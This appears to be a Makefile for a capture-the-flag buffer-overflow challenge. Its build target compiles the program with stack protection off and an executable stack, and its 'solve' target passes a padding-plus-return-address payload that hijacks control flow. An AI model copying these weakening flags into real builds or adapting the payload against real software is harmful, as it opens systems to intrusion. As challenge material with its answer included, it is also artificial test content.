EXEC = fathi_challenge

all:
	gcc -fno-stack-protector -z execstack -O0 -fno-optimize-sibling-calls -fno-ipa-cp -fno-optimize-strlen -fno-asynchronous-unwind-tables -g0  fathi_challenge.c -o $(EXEC) -T layout.ld

solve:
	./fathi_challenge $$'AAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB\x37\x13\x40\x00\x00\x00\x00\x00'